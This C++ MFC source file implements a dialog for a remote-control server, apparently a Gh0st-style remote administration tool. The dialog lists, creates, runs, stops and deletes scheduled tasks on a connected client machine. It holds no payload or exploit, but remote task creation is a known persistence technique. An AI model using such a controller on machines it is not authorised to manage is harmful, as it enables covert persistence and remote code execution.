// CTaskDlg.cpp: 实现文件
//

#include "pch.h"
#include "nbclass.h"
#include "CTaskDlg.h"
#include "afxdialogex.h"
#include"../../common/macros.h"
#include"Sortthelist.h"
#include"CCreateTaskDlg.h"

// CTaskDlg 对话框

IMPLEMENT_DYNAMIC(CTaskDlg, CDialog)

CTaskDlg::CTaskDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialog(IDD_TASKDLG, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
}

CTaskDlg::~CTaskDlg()
{
}

void CTaskDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TASKLIST, m_list);
}


BEGIN_MESSAGE_MAP(CTaskDlg, CDialog)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_TASKLIST, &CTaskDlg::OnNMRClickTasklist)
	ON_COMMAND(ID_TASK_32862, &CTaskDlg::OnTaskShuaxin)
	ON_COMMAND(ID_TASK_32814, &CTaskDlg::OnCreateTask)
	ON_COMMAND(ID_TASK_32811, &CTaskDlg::OnTaskRun)
	ON_COMMAND(ID_TASK_32812, &CTaskDlg::OnTaskStop)
	ON_COMMAND(ID_TASK_32813, &CTaskDlg::OnTaskDel)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_TASKLIST, &CTaskDlg::OnLvnColumnclickTasklist)
END_MESSAGE_MAP()

void CTaskDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	if (!m_list.GetSafeHwnd())
		return;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;
	m_list.MoveWindow(&rectList);

}

CString oleTime2Str(double time) {


	//2209190400 :指的是1990年1月1日-1970年1月1日的时间秒数
	time_t t = time * 24 * 3600 - 2209190400;
	struct tm tm1;
	CString str;
	localtime_s(&tm1, &t);

	char sz[64];
	memset(sz, 0, 64);
	sprintf_s(sz, "%04d-%02d-%02d %02d:%02d:%02d"
		, tm1.tm_year + 1900,
		tm1.tm_mon + 1,
		tm1.tm_mday,
		tm1.tm_hour,
		tm1.tm_min,
		tm1.tm_sec);
	if (time == 0)
	{
		str = "";
	}
	else
	{
		str = sz;
	}
	
	return str;
}

void CTaskDlg::ShowTaskList()
{

	m_list.DeleteAllItems();

	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));

	char* taskname;
	char* taskpath;
	char* exepath;
	char* status;
	DATE lasttime = 0;
	DATE nexttime = 0;
	DWORD	dwOffset = 0;
	CString str;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{

		taskname = lpBuffer + dwOffset;
		taskpath = taskname + lstrlen(taskname) + 1;
		exepath = taskpath + lstrlen(taskpath) + 1;
		status = exepath + lstrlen(exepath) + 1;
		lasttime = *((DATE*)(status + lstrlen(status)+1));
		nexttime = *((DATE*)(status + lstrlen(status) + 1+sizeof(DATE)));
		ULONGLONG a = *((ULONGLONG*)(&lasttime));
		str.Format("%d", i+1);
		m_list.InsertItem(i, str);

		str = taskpath;
		str.Replace(taskname, "");
		m_list.SetItemText(i, 1, str);
		m_list.SetItemText(i, 2, taskname);
		m_list.SetItemText(i, 3, exepath);
		m_list.SetItemText(i, 4, status);
		str = oleTime2Str(lasttime);
		m_list.SetItemText(i, 5, str);
		str = oleTime2Str(nexttime);
		m_list.SetItemText(i, 6, str);

		dwOffset += lstrlen(taskname) + 1 +
			lstrlen(taskpath) + 1 +
			lstrlen(exepath) + 1 +
			lstrlen(status) + 1 + sizeof(DATE) * 2;

		if (lpBuffer[dwOffset] == 0 && lpBuffer[dwOffset+1] == 0)
		{
			break;
		}
	}
}

void CTaskDlg::GetTaskList()
{
	BYTE bToken = COMMAND_TASKLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);

}

void CTaskDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_TASKLIST:
		ShowTaskList();
		break;
	default:
		break;
	}
}
// CTaskDlg 消息处理程序


BOOL CTaskDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 计划任务", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);

	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_GRIDLINES | LVS_EX_INFOTIP);
	m_list.InsertColumn(0, "序号", LVCFMT_LEFT, 30);
	m_list.InsertColumn(1, "目录", LVCFMT_LEFT, 350);
	m_list.InsertColumn(2, "任务名称", LVCFMT_LEFT,300);
	m_list.InsertColumn(3, "程序路径", LVCFMT_LEFT, 400);
	m_list.InsertColumn(4, "状态", LVCFMT_LEFT, 50);
	m_list.InsertColumn(5, "最后执行时间", LVCFMT_LEFT, 130);
	m_list.InsertColumn(6, "下次执行时间", LVCFMT_LEFT, 130);


	AdjustList();

	ShowTaskList();
	// TODO:  在此添加额外的初始化

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CTaskDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	AdjustList();
}

/// <summary>
/// 关闭
/// </summary>
void CTaskDlg::OnClose()
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
}


BOOL CTaskDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

/// <summary>
/// 鼠标右键
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CTaskDlg::OnNMRClickTasklist(NMHDR* pNMHDR, LRESULT* pResult)
{
	CMenu	popup;
	popup.LoadMenu(IDR_TASKLIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
}

/// <summary>
/// 刷新
/// </summary>
void CTaskDlg::OnTaskShuaxin()
{
	GetTaskList();
}

/// <summary>
/// 创建
/// </summary>
void CTaskDlg::OnCreateTask()
{
	DWORD len = 0;
	DWORD offset = 0;
	CCreateTaskDlg* dlg = new CCreateTaskDlg(this);

	if (IDOK == dlg->DoModal())
	{

		//计算字符串长度
		len = strlen(dlg->m_TaskPath.GetBuffer()) + strlen(dlg->m_TaskNames.GetBuffer()) + strlen(dlg->m_ExePath.GetBuffer()) + strlen(dlg->m_ZhuoZhe.GetBuffer()) + strlen(dlg->m_MiaoShu.GetBuffer()) + 6;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, len);
		if (lpBuffer)
		{
			lpBuffer[0] = COMMAND_TASKCREAT;
			offset++;

			memcpy(lpBuffer + offset, dlg->m_TaskPath.GetBuffer(), strlen(dlg->m_TaskPath.GetBuffer()) +1);
			offset += strlen(dlg->m_TaskPath.GetBuffer()) +1;

			memcpy(lpBuffer + offset, dlg->m_TaskNames.GetBuffer(), strlen(dlg->m_TaskNames.GetBuffer()) +1);
			offset += strlen(dlg->m_TaskNames.GetBuffer())+1;

			memcpy(lpBuffer + offset, dlg->m_ExePath.GetBuffer(), strlen(dlg->m_ExePath.GetBuffer())+1);
			offset += strlen(dlg->m_ExePath.GetBuffer())+1;

			memcpy(lpBuffer + offset, dlg->m_ZhuoZhe.GetBuffer(), strlen(dlg->m_ZhuoZhe.GetBuffer()) + 1);
			offset += strlen(dlg->m_ZhuoZhe.GetBuffer()) + 1;

			memcpy(lpBuffer + offset, dlg->m_MiaoShu.GetBuffer(), strlen(dlg->m_MiaoShu.GetBuffer()) + 1);
			offset += strlen(dlg->m_MiaoShu.GetBuffer()) + 1;
			m_iocpServer->Send(m_pContext, lpBuffer, len);

			LocalFree(lpBuffer);
		}

		
	}

	delete dlg;
}

/// <summary>
/// 执行
/// </summary>
void CTaskDlg::OnTaskRun()
{
	CString		taskpath;
	CString		taskname;
	DWORD offset = 0;
	int		nItem = m_list.GetNextItem(-1, LVNI_SELECTED);
	if (nItem == -1)
	{
		return;
	}

	taskpath = m_list.GetItemText(nItem, 1);
	taskname = m_list.GetItemText(nItem, 2);

	int nPacketLength = strlen(taskpath.GetBuffer()) + strlen(taskname.GetBuffer()) + 3;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_TASKSTART;
	offset++;

	memcpy(lpBuffer + offset, taskpath.GetBuffer(), strlen(taskpath.GetBuffer()) + 1);
	offset += strlen(taskpath.GetBuffer()) + 1;

	memcpy(lpBuffer + offset, taskname.GetBuffer(), strlen(taskname.GetBuffer()) + 1);
	offset += strlen(taskname.GetBuffer()) + 1;

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}

/// <summary>
/// 停止
/// </summary>
void CTaskDlg::OnTaskStop()
{
	CString		taskpath;
	CString		taskname;
	DWORD offset = 0;
	int		nItem = m_list.GetNextItem(-1, LVNI_SELECTED);
	if (nItem == -1)
	{
		return;
	}

	taskpath = m_list.GetItemText(nItem, 1);
	taskname = m_list.GetItemText(nItem, 2);

	int nPacketLength = strlen(taskpath.GetBuffer()) + strlen(taskname.GetBuffer()) + 3;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_TASKSTOP;
	offset++;

	memcpy(lpBuffer + offset, taskpath.GetBuffer(), strlen(taskpath.GetBuffer()) + 1);
	offset += strlen(taskpath.GetBuffer()) + 1;

	memcpy(lpBuffer + offset, taskname.GetBuffer(), strlen(taskname.GetBuffer()) + 1);
	offset += strlen(taskname.GetBuffer()) + 1;

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}

/// <summary>
/// 删除
/// </summary>
void CTaskDlg::OnTaskDel()
{
	CString		taskpath;
	CString		taskname;
	DWORD offset = 0;
	int		nItem = m_list.GetNextItem(-1, LVNI_SELECTED);
	if (nItem == -1)
	{
		return;
	}

	taskpath = m_list.GetItemText(nItem, 1);
	taskname = m_list.GetItemText(nItem, 2);

	int nPacketLength = strlen(taskpath.GetBuffer()) + strlen(taskname.GetBuffer()) + 3;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = COMMAND_TASKDEL;
	offset++;

	memcpy(lpBuffer + offset, taskpath.GetBuffer(), strlen(taskpath.GetBuffer()) + 1);
	offset += strlen(taskpath.GetBuffer()) + 1;

	memcpy(lpBuffer + offset, taskname.GetBuffer(), strlen(taskname.GetBuffer()) + 1);
	offset += strlen(taskname.GetBuffer()) + 1;

	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength);

	LocalFree(lpBuffer);
}


extern int strsort_column;	// 记录点击的列

/// <summary>
/// 排序
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
void CTaskDlg::OnLvnColumnclickTasklist(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	strsort_column = pNMLV->iSubItem;//点击的列
	int count = m_list.GetItemCount();
	for (int i = 0; i < count; i++)
		m_list.SetItemData(i, i); // 每行的比较关键字，此处为列序号（点击的列号），可以设置为其他 比较函数的第一二个参数
	m_list.SortItems(CompareListStrProc, (DWORD_PTR)&m_list);//排序 第二个参数是比较函数的第三个参数
	*pResult = 0;
}
